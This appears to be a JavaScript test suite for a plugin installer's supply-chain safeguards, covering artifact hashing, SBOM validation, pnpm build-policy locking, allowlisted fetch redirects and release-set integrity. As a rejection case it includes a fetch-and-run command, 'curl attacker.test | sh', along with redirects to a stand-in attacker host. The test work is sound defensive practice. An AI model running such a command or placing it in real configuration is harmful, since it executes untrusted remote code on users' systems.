import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import test from 'node:test';
import { gzipSync } from 'node:zlib';

import {
  lifecycleHooksFromManifest,
  lifecycleHooksSha256,
  loadAuthority as loadPluginAuthority,
  validateItem,
} from '../skills/dsh-plugin-installer/scripts/authority.mjs';
import {
  validateCycloneDxSbom,
} from '../skills/dsh-plugin-installer/scripts/archive-policy.mjs';
import {
  authorizePrepareText,
  revokePrepareText,
  validateEffectivePnpmBuildPolicy,
  verifyEffectivePnpmBuildPolicy,
} from '../skills/dsh-plugin-installer/scripts/prepare-authorization.mjs';
import {
  fetchAuthorityBoundSource,
  fetchBoundedExact,
} from '../skills/dsh-plugin-installer/scripts/fetch-plugin-source.mjs';
import {
  itemAuthoritySha256,
  releaseSetPayloadSha256,
  validateTop10ReleaseSet,
} from '../skills/dsh-plugin-installer/scripts/top10-authority.mjs';
import { loadAuthority as loadHarnessAuthority } from '../skills/dsh-harness-installer/scripts/authority.mjs';
import {
  runtimeProvenanceSetSha256,
  runtimeReceiptSetPayloadSha256,
  runtimeSha256,
  validateRuntimeReceipt,
  validateRuntimeReceiptSet,
} from '../skills/dsh-harness-installer/scripts/runtime-authority.mjs';

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function integrity(digest) {
  return `sha256-${Buffer.from(digest, 'hex').toString('base64')}`;
}

function sha512Integrity(bytes) {
  return `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
}

function tar(entries) {
  const blocks = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body ?? '');
    const header = Buffer.alloc(512);
    header.write(entry.name, 0, 'utf8');
    const octal = (value, offset, length) => {
      header.write(`${value.toString(8).padStart(length - 1, '0')}\0`, offset, 'ascii');
    };
    octal(0o644, 100, 8);
    octal(0, 108, 8);
    octal(0, 116, 8);
    octal(body.length, 124, 12);
    octal(0, 136, 12);
    header.fill(0x20, 148, 156);
    header[156] = 0x30;
    header.write('ustar\0', 257, 'ascii');
    header.write('00', 263, 'ascii');
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(`${checksum.toString(8).padStart(6, '0')}\0 `, 148, 'ascii');
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks), { level: 9, mtime: 0 });
}

function lifecycle(scripts = {}) {
  const hooks = lifecycleHooksFromManifest({ scripts });
  return {
    hooks,
    hooksSha256: lifecycleHooksSha256(hooks),
    transitiveDependencyRisk: 'pnpm-may-run-transitive-dependency-lifecycle-scripts',
  };
}

function runtimeAcceptance(id, name, version) {
  return {
    schemaVersion: 1,
    dumpConfig: {
      kind: 'exact-cordis-entry',
      entryId: `fixture-${id}`,
      packageName: name,
      occurrence: 'exactly-one',
    },
    functionalProbe: {
      kind: 'cold-web-start-with-plugin-inventory',
      packageName: name,
      version,
      unauthenticatedRootStatus: 401,
    },
  };
}

function itemBase({ id, slug, name, version, distribution, scripts = {}, redistribution = 'upstream-only' }) {
  const packageLifecycle = lifecycle(scripts);
  const authorizedHooks = Object.keys(packageLifecycle.hooks)
    .filter((hook) => packageLifecycle.hooks[hook] !== null);
  return {
    catalogId: id,
    slug,
    title: `Fixture ${id}`,
    status: 'verified-installable',
    profile: 'web',
    distribution,
    package: {
      name,
      version,
      bundlePatch: 'cordis.patch.yml',
      lifecycle: packageLifecycle,
      lifecycleAuthorization: {
        required: authorizedHooks.length > 0,
        packageKey: authorizedHooks.length > 0 ? name : null,
        authorizedHooks,
        hooksSha256: authorizedHooks.length > 0 ? packageLifecycle.hooksSha256 : null,
      },
    },
    runtimeAcceptance: runtimeAcceptance(id, name, version),
    safety: {
      consentRequired: true,
      permissions: ['Reads only the user-approved workspace.'],
      network: [],
      processes: [],
      files: [],
    },
    rights: {
      licenseExpression: 'MIT',
      sourceUrl: 'https://github.com/example/plugin',
      redistribution,
    },
    rollback: { removePackageName: name, coldRestartRequired: true },
    receipts: {
      status: 'verified',
      runtimeReceiptSha256: 'a'.repeat(64),
      platformNodeMatrixSha256: 'b'.repeat(64),
    },
  };
}

function packageArchive({ name, version, scripts = {} }) {
  const manifest = Buffer.from(`${JSON.stringify({
    name,
    version,
    scripts,
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  })}\n`);
  return {
    manifest,
    bytes: tar([
      { name: 'package/package.json', body: manifest },
      { name: 'package/cordis.patch.yml', body: '[]\n' },
    ]),
  };
}

function hostedFixture() {
  const id = 3001;
  const name = 'dsh-hosted-fixture';
  const version = '1.0.0';
  const slug = 'hosted-fixture';
  const manifestDocument = {
    name,
    version,
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  };
  const manifest = Buffer.from(`${JSON.stringify(manifestDocument)}\n`);
  const manifestSha256 = sha256(manifest);
  const purl = `pkg:npm/${name}@${version}`;
  const component = {
    type: 'library',
    name,
    version,
    purl,
    'bom-ref': purl,
    properties: [{
      name: 'dsh-themes:package-manifest-sha256',
      value: manifestSha256,
    }],
  };
  const sbomDocument = {
    bomFormat: 'CycloneDX',
    specVersion: '1.6',
    version: 1,
    metadata: { component },
    components: [],
    dependencies: [{ ref: purl, dependsOn: [] }],
  };
  const license = Buffer.from('MIT License\n');
  const sbom = Buffer.from(`${JSON.stringify(sbomDocument)}\n`);
  const artifact = tar([
    { name: 'package/package.json', body: manifest },
    { name: 'package/cordis.patch.yml', body: '[]\n' },
    { name: 'package/LICENSE', body: license },
    { name: 'package/SBOM.cdx.json', body: sbom },
  ]);
  const artifactSha256 = sha256(artifact);
  const assetName = `${slug}-${version}.tgz`;
  const item = itemBase({
    id,
    slug,
    name,
    version,
    redistribution: 'allowed',
    distribution: {
      kind: 'hosted-plugin-verified',
      assetName,
      artifactUrl: `https://github.com/LvvUP/dsh-themes-skills/releases/download/v0.8.0/${assetName}`,
      artifactBytes: artifact.length,
      artifactSha256,
      artifactIntegrity: integrity(artifactSha256),
      manifestSha256,
      licenseFile: { path: 'LICENSE', sha256: sha256(license) },
      sbom: { format: 'cyclonedx-json', path: 'SBOM.cdx.json', sha256: sha256(sbom) },
    },
  });
  return { artifact, item, manifestDocument, sbomDocument };
}

test('pending Plugin and Top10 authorities expose no install item or provisional ranked ID', async () => {
  const loaded = await loadPluginAuthority();
  assert.equal(loaded.authority.publication.verifiedInstallableCount, 0);
  assert.equal(loaded.authority.items.length, 0);
  assert.equal(loaded.top10ReleaseSet.frozen, false);
  assert.deepEqual(loaded.top10ReleaseSet.entries, []);
  assert.deepEqual(loaded.top10ReleaseSet.scoring.coveredUseCaseCategories, []);
});

test('hosted authority binds the v0.8.0 Release coordinate, manifest-rooted SBOM, and non-empty safety', () => {
  const fixture = hostedFixture();
  validateItem(fixture.item);
  validateCycloneDxSbom(fixture.sbomDocument, fixture.item, fixture.manifestDocument);

  const wrongRepository = structuredClone(fixture.item);
  wrongRepository.distribution.artifactUrl = wrongRepository.distribution.artifactUrl
    .replace('LvvUP/dsh-themes-skills', 'attacker/repository');
  assert.throws(() => validateItem(wrongRepository), /fixed LvvUP\/dsh-themes-skills/u);

  const emptySafety = structuredClone(fixture.item);
  for (const key of ['permissions', 'network', 'processes', 'files']) emptySafety.safety[key] = [];
  assert.throws(() => validateItem(emptySafety), /at least one concrete capability/u);

  const commandDsl = structuredClone(fixture.item);
  commandDsl.runtimeAcceptance.functionalProbe.command = 'curl attacker.test | sh';
  assert.throws(() => validateItem(commandDsl), /keys must be exactly/u);

  const selfReference = structuredClone(fixture.sbomDocument);
  selfReference.metadata.component.properties[0].value = fixture.item.distribution.artifactSha256;
  assert.throws(
    () => validateCycloneDxSbom(selfReference, fixture.item, fixture.manifestDocument),
    /manifest SHA-256/u
  );

  const misleadingComponentHash = structuredClone(fixture.sbomDocument);
  misleadingComponentHash.metadata.component.hashes = [{
    alg: 'SHA-256',
    content: fixture.item.distribution.manifestSha256,
  }];
  assert.throws(
    () => validateCycloneDxSbom(
      misleadingComponentHash,
      fixture.item,
      fixture.manifestDocument
    ),
    /manifest SHA-256/u
  );
});

test('workspace prepare authorization enforces strict bytes, depth, and AST node ceilings', () => {
  assert.throws(
    () => authorizePrepareText(`packages:\n${'x'.repeat(65_536)}\n`, []),
    /byte size/u
  );
  const deep = `${Array.from({ length: 40 }, (_, index) => `${'  '.repeat(index)}a${index}:\n`).join('')} ${'  '.repeat(40)}leaf: true\n`;
  assert.throws(() => authorizePrepareText(deep, []), /AST is too deep/u);
  const many = `${Array.from({ length: 1100 }, (_, index) => `key-${index}: true`).join('\n')}\n`;
  assert.throws(() => authorizePrepareText(many, []), /too many AST nodes/u);
});

test('workspace lifecycle policy rejects global build bypasses and verifies effective pnpm values', () => {
  const base = 'packages:\n  - .\n';
  const normalized = authorizePrepareText(base, []);
  assert.equal(normalized.changed, true);
  assert.match(normalized.source, /dangerouslyAllowAllBuilds: false/u);
  assert.match(normalized.source, /strictDepBuilds: true/u);
  assert.throws(
    () => authorizePrepareText(`${base}dangerouslyAllowAllBuilds: true\n`, []),
    /unsafe lifecycle build policy/u
  );
  assert.throws(
    () => authorizePrepareText(`${base}strictDepBuilds: false\n`, []),
    /unsafe lifecycle build policy/u
  );
  assert.throws(
    () => authorizePrepareText(`${base}dangerouslyAllowAllBuilds: "false"\n`, []),
    /literal boolean false/u
  );

  const safe = {
    allowBuilds: { '@example/plugin': true },
    dangerouslyAllowAllBuilds: false,
    strictDepBuilds: true,
  };
  assert.equal(
    validateEffectivePnpmBuildPolicy(safe, ['@example/plugin'], true),
    safe
  );
  assert.throws(
    () => validateEffectivePnpmBuildPolicy({ ...safe, dangerouslyAllowAllBuilds: true }, ['@example/plugin'], true),
    /unsafe/u
  );
  assert.throws(
    () => validateEffectivePnpmBuildPolicy({ ...safe, strictDepBuilds: false }, ['@example/plugin'], true),
    /unsafe/u
  );
  assert.throws(
    () => validateEffectivePnpmBuildPolicy({ ...safe, allowBuilds: {} }, ['@example/plugin'], true),
    /does not match/u
  );

  assert.throws(
    () => verifyEffectivePnpmBuildPolicy(
      resolve('fixture-web-profile'),
      ['@example/plugin'],
      true
    ),
    /only one controlled environment/u
  );
});

test('prepare policy has no standalone mutation or implicit process-environment path', () => {
  const result = spawnSync(process.execPath, [
    resolve('skills/dsh-plugin-installer/scripts/prepare-authorization.mjs'),
    '--profile', resolve('fixture-web-profile'), '--id', '#3001',
  ], { encoding: 'utf8', shell: false });
  assert.equal(result.status, 1);
  assert.equal(result.stdout, '');
  assert.match(result.stderr, /direct prepare authorization is disabled/u);
});

test('workspace lifecycle revocation removes only selected true entries and preserves denials', () => {
  const name = 'dsh-revoke-one';
  const version = '1.0.0';
  const tarballBytes = Buffer.from('fixture tarball');
  const first = itemBase({
    id: 3006,
    slug: 'revoke-one',
    name,
    version,
    scripts: { prepare: 'pnpm run build' },
    distribution: {
      kind: 'upstream-plugin-verified',
      source: {
        type: 'npm-package-version',
        registry: 'https://registry.npmjs.org',
        packageName: name,
        version,
        installSpec: `${name}@${version}`,
        metadataSha256: '8'.repeat(64),
        tarballUrl: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
        tarballBytes: tarballBytes.length,
        tarballSha256: sha256(tarballBytes),
        distIntegrity: sha512Integrity(tarballBytes),
      },
    },
  });
  validateItem(first);
  const source = [
    'packages:',
    '  - .',
    'dangerouslyAllowAllBuilds: false',
    'strictDepBuilds: true',
    'allowBuilds:',
    `  ${first.package.name}: true`,
    '  unrelated-package: true',
    '  denied-package: false',
    '',
  ].join('\n');
  const revoked = revokePrepareText(source, [first]);
  assert.doesNotMatch(revoked.source, new RegExp(`^  ${first.package.name}:`, 'mu'));
  assert.match(revoked.source, /unrelated-package: true/u);
  assert.match(revoked.source, /denied-package: false/u);
  assert.doesNotThrow(() => validateEffectivePnpmBuildPolicy({
    allowBuilds: { 'unrelated-package': true, 'denied-package': false },
    dangerouslyAllowAllBuilds: false,
    strictDepBuilds: true,
  }, [first.package.name], false));
});

test('bounded fetch uses manual allowlisted redirects, exact bytes, and streaming limits', async () => {
  const body = Buffer.from('verified artifact');
  const digest = sha256(body);
  const calls = [];
  const result = await fetchBoundedExact({
    url: 'https://github.com/LvvUP/dsh-themes-skills/releases/download/v0.8.0/plugin.tgz',
    expectedOrigin: 'https://github.com',
    allowedOrigins: new Set(['https://github.com', 'https://release-assets.githubusercontent.com']),
    maxBytes: 1024,
    expectedBytes: body.length,
    expectedSha256: digest,
    fetchImpl: async (url, options) => {
      calls.push({
        url: String(url),
        redirect: options.redirect,
        credentials: options.credentials,
        accept: options.headers.accept,
      });
      if (calls.length === 1) {
        return new Response(null, {
          status: 302,
          headers: { location: 'https://release-assets.githubusercontent.com/private-signed-location' },
        });
      }
      return new Response(body, { status: 200 });
    },
  });
  assert.equal(result.sha256, digest);
  assert.equal(result.redirects, 1);
  assert.deepEqual(calls.map(({ redirect, credentials }) => ({ redirect, credentials })), [
    { redirect: 'manual', credentials: 'omit' },
    { redirect: 'manual', credentials: 'omit' },
  ]);
  assert.deepEqual(calls.map(({ accept }) => accept), [
    'application/octet-stream',
    'application/octet-stream',
  ]);

  const json = Buffer.from('{"name":"exact-metadata"}');
  const metadata = await fetchBoundedExact({
    url: 'https://registry.npmjs.org/exact-metadata/1.0.0',
    expectedOrigin: 'https://registry.npmjs.org',
    maxBytes: 1024,
    accept: 'application/json',
    fetchImpl: async (_url, options) => {
      assert.equal(options.headers.accept, 'application/json');
      return new Response(json, { status: 200 });
    },
  });
  assert.deepEqual(metadata.bytes, json);

  await assert.rejects(
    fetchBoundedExact({
      url: 'https://github.com/LvvUP/dsh-themes-skills/releases/download/v0.8.0/plugin.tgz',
      expectedOrigin: 'https://github.com',
      maxBytes: 1024,
      fetchImpl: async () => new Response(null, {
        status: 302,
        headers: { location: 'https://attacker.test/plugin.tgz' },
      }),
    }),
    /origin allowlist/u
  );
  await assert.rejects(
    fetchBoundedExact({
      url: 'https://registry.npmjs.org/pkg/1.0.0',
      expectedOrigin: 'https://registry.npmjs.org',
      maxBytes: 3,
      fetchImpl: async () => new Response(Buffer.from('four'), { status: 200 }),
    }),
    /byte limit/u
  );
  await assert.rejects(
    fetchBoundedExact({
      url: 'https://registry.npmjs.org/pkg/1.0.0',
      expectedOrigin: 'https://registry.npmjs.org',
      maxBytes: 1024,
      accept: 'text/html',
      fetchImpl: async () => new Response('unused', { status: 200 }),
    }),
    /approved fixed media type/u
  );
});

test('authority-bound source fetch verifies exact npm, GitHub Release, and full Git commit without execution', async (t) => {
  const root = await mkdtemp(join(tmpdir(), 'dsh-source-fetch-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  const responses = new Map();
  const fetchImpl = async (url) => {
    const bytes = responses.get(String(url));
    return bytes ? new Response(bytes, { status: 200 }) : new Response('missing', { status: 404 });
  };

  const npmPackage = packageArchive({
    name: '@example/npm-plugin',
    version: '2.3.4',
    scripts: { postinstall: 'node postinstall.js' },
  });
  const npmTarball = 'https://registry.npmjs.org/@example/npm-plugin/-/npm-plugin-2.3.4.tgz';
  const npmMetadata = Buffer.from(`${JSON.stringify({
    name: '@example/npm-plugin',
    version: '2.3.4',
    dist: { tarball: npmTarball, integrity: sha512Integrity(npmPackage.bytes) },
  })}\n`);
  const npmItem = itemBase({
    id: 3002,
    slug: 'npm-fixture',
    name: '@example/npm-plugin',
    version: '2.3.4',
    scripts: { postinstall: 'node postinstall.js' },
    distribution: {
      kind: 'upstream-plugin-verified',
      source: {
        type: 'npm-package-version',
        registry: 'https://registry.npmjs.org',
        packageName: '@example/npm-plugin',
        version: '2.3.4',
        installSpec: '@example/npm-plugin@2.3.4',
        metadataSha256: sha256(npmMetadata),
        tarballUrl: npmTarball,
        tarballBytes: npmPackage.bytes.length,
        tarballSha256: sha256(npmPackage.bytes),
        distIntegrity: sha512Integrity(npmPackage.bytes),
      },
    },
  });
  responses.set('https://registry.npmjs.org/%40example%2Fnpm-plugin/2.3.4', npmMetadata);
  responses.set(npmTarball, npmPackage.bytes);
  const npmResult = await fetchAuthorityBoundSource({
    item: npmItem,
    output: join(root, 'npm'),
    fetchImpl,
  });
  assert.equal(npmResult.receipt.candidateExecuted, false);
  assert.equal(npmResult.receipt.evidence.metadataSha256, sha256(npmMetadata));

  const releasePackage = packageArchive({ name: 'release-plugin', version: '1.2.3' });
  const releaseUrl = 'https://github.com/example/release-plugin/releases/download/v1.2.3/release-plugin.tgz';
  const releaseItem = itemBase({
    id: 3003,
    slug: 'release-fixture',
    name: 'release-plugin',
    version: '1.2.3',
    distribution: {
      kind: 'upstream-plugin-verified',
      source: {
        type: 'github-release-asset',
        repository: 'https://github.com/example/release-plugin',
        tag: 'v1.2.3',
        assetName: 'release-plugin.tgz',
        assetUrl: releaseUrl,
        assetBytes: releasePackage.bytes.length,
        assetSha256: sha256(releasePackage.bytes),
        assetIntegrity: integrity(sha256(releasePackage.bytes)),
        manifestSha256: sha256(releasePackage.manifest),
      },
    },
  });
  responses.set(releaseUrl, releasePackage.bytes);
  const releaseResult = await fetchAuthorityBoundSource({
    item: releaseItem,
    output: join(root, 'release'),
    fetchImpl,
  });
  assert.equal(releaseResult.receipt.evidence.manifestSha256, sha256(releasePackage.manifest));

  const commit = 'c'.repeat(40);
  const tree = 'd'.repeat(40);
  const gitManifest = Buffer.from(`${JSON.stringify({
    name: 'git-plugin',
    version: '3.0.0',
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  })}\n`);
  const lockfile = Buffer.from('lockfileVersion: 9.0\n');
  const gitItem = itemBase({
    id: 3004,
    slug: 'git-fixture',
    name: 'git-plugin',
    version: '3.0.0',
    distribution: {
      kind: 'upstream-plugin-verified',
      source: {
        type: 'git-commit',
        repository: 'https://github.com/example/git-plugin.git',
        commit,
        tree,
        subdir: '.',
        installSpec: `git+https://github.com/example/git-plugin.git#${commit}`,
        manifestSha256: sha256(gitManifest),
        lockfilePath: 'pnpm-lock.yaml',
        lockfileSha256: sha256(lockfile),
      },
    },
  });
  responses.set(`https://api.github.com/repos/example/git-plugin/git/commits/${commit}`,
    Buffer.from(JSON.stringify({ sha: commit, tree: { sha: tree } })));
  responses.set(`https://raw.githubusercontent.com/example/git-plugin/${commit}/package.json`, gitManifest);
  responses.set(`https://raw.githubusercontent.com/example/git-plugin/${commit}/pnpm-lock.yaml`, lockfile);
  const gitResult = await fetchAuthorityBoundSource({
    item: gitItem,
    output: join(root, 'git'),
    fetchImpl,
  });
  assert.equal(gitResult.receipt.evidence.sourceCommit, commit);
  assert.equal(gitResult.receipt.evidence.sourceTree, tree);
  const savedReceipt = JSON.parse(await readFile(join(root, 'git', 'fetch-receipt.json'), 'utf8'));
  assert.equal(JSON.stringify(savedReceipt).includes('github.com'), false);
  assert.equal(savedReceipt.candidateExecuted, false);
});

test('future frozen Top10 requires six scores, exact totals, ranking, eight-use-case union, and coexistence receipts', async () => {
  const loaded = await loadPluginAuthority();
  const items = Array.from({ length: 80 }, (_, index) => ({
    catalogId: 3000 + index,
    identity: `fixture-${index}`,
    receipts: { platformNodeMatrixSha256: sha256(Buffer.from(`matrix-${index}`)) },
  }));
  const entries = items.slice(0, 10).map((item, index) => {
    const scores = {
      userValueAndUseCaseClarity: 25 - index,
      stabilityMaintenanceAndAlpha1Fit: 25,
      securityAndPermissionRestraint: 15,
      crossPlatformInstallRemoveRollback: 15,
      nonTechnicalUsabilityAndDocs: 10,
      combinationComplementarity: 10,
    };
    return {
      rank: index + 1,
      publicId: `#${item.catalogId}`,
      catalogId: item.catalogId,
      itemAuthoritySha256: itemAuthoritySha256(item),
      useCaseCategories: [`category-${String(index).padStart(2, '0')}`],
      scores,
      totalScore: Object.values(scores).reduce((sum, value) => sum + value, 0),
      maintenanceActivityAt: '2026-08-30',
      maintenanceActivityReceiptSha256: sha256(Buffer.from(`activity-${index}`)),
    };
  });
  const itemAuthoritySetSha256 = sha256(Buffer.from(`${JSON.stringify(entries.map((entry) => ({
    catalogId: entry.catalogId,
    itemAuthoritySha256: entry.itemAuthoritySha256,
  })))}\n`));
  const platformNodeMatrixSetSha256 = sha256(Buffer.from(`${JSON.stringify(entries.map((entry) => ({
    catalogId: entry.catalogId,
    platformNodeMatrixSha256: items.find((item) => item.catalogId === entry.catalogId)
      .receipts.platformNodeMatrixSha256,
  })))}\n`));
  const releaseSet = structuredClone(loaded.top10ReleaseSet);
  releaseSet.status = 'verified-frozen';
  releaseSet.frozen = true;
  releaseSet.scoring.coverageStatus = 'verified';
  releaseSet.scoring.coveredUseCaseCategories = entries
    .flatMap((entry) => entry.useCaseCategories)
    .sort();
  releaseSet.entries = entries;
  Object.assign(releaseSet.gate, {
    verifiedPluginCount: 80,
    verifiedMatrixTasksPerItem: 6,
    itemAuthorityComplete: true,
    allEightyVerified: true,
    sixTaskMatrixVerified: true,
    transactionPreflightVerified: true,
    transactionRollbackVerified: true,
    webCoexistenceVerified: true,
    conflictMatrixVerified: true,
    transactionPreflightReceiptSha256: '1'.repeat(64),
    transactionRollbackReceiptSha256: '2'.repeat(64),
    webCoexistenceReceiptSha256: '3'.repeat(64),
    conflictMatrixReceiptSha256: '4'.repeat(64),
    itemAuthoritySetSha256,
    platformNodeMatrixSetSha256,
  });
  releaseSet.releaseSetPayloadSha256 = releaseSetPayloadSha256(releaseSet);
  const authority = {
    harness: { installable: true },
    publication: { publishedInstallable: true },
    items,
  };
  validateTop10ReleaseSet(releaseSet, { authority });

  const badTotal = structuredClone(releaseSet);
  badTotal.entries[0].totalScore -= 1;
  badTotal.releaseSetPayloadSha256 = releaseSetPayloadSha256(badTotal);
  assert.throws(() => validateTop10ReleaseSet(badTotal, { authority }), /total score/u);

  const badRank = structuredClone(releaseSet);
  [badRank.entries[0], badRank.entries[1]] = [badRank.entries[1], badRank.entries[0]];
  badRank.entries.forEach((entry, index) => { entry.rank = index + 1; });
  badRank.releaseSetPayloadSha256 = releaseSetPayloadSha256(badRank);
  assert.throws(() => validateTop10ReleaseSet(badRank, { authority }), /not ordered/u);

  const noCoexistence = structuredClone(releaseSet);
  noCoexistence.gate.webCoexistenceVerified = false;
  noCoexistence.releaseSetPayloadSha256 = releaseSetPayloadSha256(noCoexistence);
  assert.throws(() => validateTop10ReleaseSet(noCoexistence, { authority }), /complete 80\/80/u);
});

test('Harness runtime set accepts only the canonical six-task shared-run matrix while current publication remains 0/6', async () => {
  const authority = await loadHarnessAuthority();
  assert.equal(authority.publication.completedReceipts.length, 0);
  assert.equal(authority.publication.receiptSetSha256, null);
  const workflow = {
    repository: 'LvvUP/dsh-themes-skills',
    workflowPath: '.github/workflows/alpha1-runtime-certification.yml',
    workflowSha256: '5'.repeat(64),
    runId: '123456789',
    runAttempt: 1,
    headSha: '6'.repeat(40),
  };
  const source = {
    tag: authority.release.tag,
    commit: authority.release.commit,
    tree: authority.release.tree,
    lockfileSha256: authority.source.lockfileSha256,
  };
  const tasks = [
    ['linux', 'x64'],
    ['darwin', 'arm64'],
    ['win32', 'x64'],
  ].flatMap(([platform, arch]) => ['22.19.0', '24.15.0']
    .map((nodeVersion) => ({ platform, arch, nodeVersion })));
  const receiptBytesBySha256 = new Map();
  const entries = tasks.map((task, index) => {
    const receipt = {
      schemaVersion: 1,
      status: 'alpha1-runtime-task-passed',
      scope: 'one-platform-node-task',
      source,
      task,
      build: {
        buildReceiptSha256: sha256(Buffer.from(`build-receipt-${index}`)),
        builtCliSha256: sha256(Buffer.from(`built-cli-${index}`)),
      },
      probes: {
        cli: { reportedVersion: '0.1.2-alpha.1' },
        profile: { name: 'web', dumpConfigPassed: true },
        browserAuth: {
          unauthenticatedRootStatus: 401,
          launchExchangeStatus: 303,
          authenticatedSessionStatus: 200,
          hostOnlyRejectionStatus: 403,
          originOnlyRejectionStatus: 403,
          crossSiteRejectionStatus: 403,
          restartStatus: 'prior-session-persisted-launch-credential-rotated',
        },
        webProtocol: {
          entriesAndBatches: true,
          comboUrl: true,
          revision404: true,
          javascriptMime: 'text/javascript',
          sourceMapMime: 'application/json',
          gzip: true,
          identity: true,
          cache: true,
          bootReady: true,
        },
      },
      ci: { ...workflow, jobId: `runtime-${index}` },
      privacy: {
        capturesProcessOutput: false,
        capturesEnvironment: false,
        capturesBrowserSecrets: false,
        capturesSecretDerivedDigest: false,
      },
    };
    const bytes = Buffer.from(`${JSON.stringify(receipt, null, 2)}\n`);
    const receiptSha256 = runtimeSha256(bytes);
    receiptBytesBySha256.set(receiptSha256, bytes);
    return { ...task, receiptSha256, jobId: receipt.ci.jobId };
  });
  const receiptSet = {
    schemaVersion: 1,
    status: 'alpha1-runtime-matrix-verified',
    source,
    workflow,
    requiredReceiptCount: 6,
    receipts: entries,
    provenanceSetSha256: '0'.repeat(64),
    receiptSetPayloadSha256: '0'.repeat(64),
  };
  receiptSet.provenanceSetSha256 = runtimeProvenanceSetSha256(receiptSet);
  receiptSet.receiptSetPayloadSha256 = runtimeReceiptSetPayloadSha256(receiptSet);
  validateRuntimeReceiptSet(receiptSet, { authority, receiptBytesBySha256 });

  const leakedReceipt = JSON.parse(receiptBytesBySha256.values().next().value);
  leakedReceipt.ci.jobId = 'A'.repeat(43);
  assert.throws(
    () => validateRuntimeReceipt(leakedReceipt, authority),
    /forbidden BrowserAuth material/u
  );

  const leakedSet = structuredClone(receiptSet);
  leakedSet.receipts[0].jobId = 'A'.repeat(43);
  leakedSet.provenanceSetSha256 = runtimeProvenanceSetSha256(leakedSet);
  leakedSet.receiptSetPayloadSha256 = runtimeReceiptSetPayloadSha256(leakedSet);
  assert.throws(
    () => validateRuntimeReceiptSet(leakedSet, { authority, receiptBytesBySha256 }),
    /forbidden BrowserAuth material/u
  );

  const reordered = structuredClone(receiptSet);
  [reordered.receipts[0], reordered.receipts[1]] = [reordered.receipts[1], reordered.receipts[0]];
  reordered.provenanceSetSha256 = runtimeProvenanceSetSha256(reordered);
  reordered.receiptSetPayloadSha256 = runtimeReceiptSetPayloadSha256(reordered);
  assert.throws(
    () => validateRuntimeReceiptSet(reordered, { authority, receiptBytesBySha256 }),
    /canonical unique matrix/u
  );
});
